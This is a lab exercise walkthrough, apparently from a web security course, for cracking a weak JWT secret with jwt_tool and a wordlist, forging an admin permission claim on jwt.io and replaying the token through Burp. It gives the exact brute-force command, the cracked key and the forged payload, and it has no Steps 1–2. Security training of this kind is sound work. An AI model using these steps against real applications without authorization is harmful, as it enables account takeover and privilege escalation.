# Exercise 10 - Bruteforcing Weak Secret Keys in JWT

## Objective

Learn how to brute-force a weak JWT secret key, modify the JWT payload, generate a valid token, and gain **Admin** privileges.

---

# Concept

Normally, a JWT is signed using a **Secret Key**.

```
Server
   │
Signs JWT using Secret Key
   │
Client receives JWT
```

If the **Secret Key is weak**, an attacker can brute-force it, modify the token, sign it again, and become an **Admin**.

# Step 3 - Capture JWT

In Burp:

```
Proxy
```

↓

```
Intercept ON
```

Click:

```
Admin Area
```

Forward requests until you find:

```
Authorization: Bearer <JWT>
```

Right Click →

```
Send to Repeater
```

Copy the JWT token.

---

# Step 4 - Analyze JWT

Open Terminal.

Go to jwt_tool:

```bash
cd jwt_tool/
```

Decode the JWT:

```bash
python3 jwt_tool.py <token>
```

This displays:

- Header
- Payload

---

# Step 5 - Bruteforce Secret Key ⭐

Run:

```bash
python3 jwt_tool.py <token> -C -d /usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt
```

After brute force:

```
Secret Key = access
```

---

# Step 6 - Modify JWT

Open:

```
https://jwt.io
```

Paste the JWT.

Go to:

```
JWT Encoder
```

Modify the payload.

Remove existing permissions.

Add:

```json
"permissions": [
  "user:admin"
]
```

Enter the secret key:

```
access
```

jwt.io automatically generates a new valid JWT.

Copy it.

---

# Step 7 - Replace JWT

Go back to Burp.

Replace:

```
Authorization: Bearer
```

with the newly generated JWT.

Forward the request.

---

# Step 8 - Verify

Open:

```
Admin Area
```

Now the application recognizes you as:

```
Admin
```

Privilege Escalation Successful.
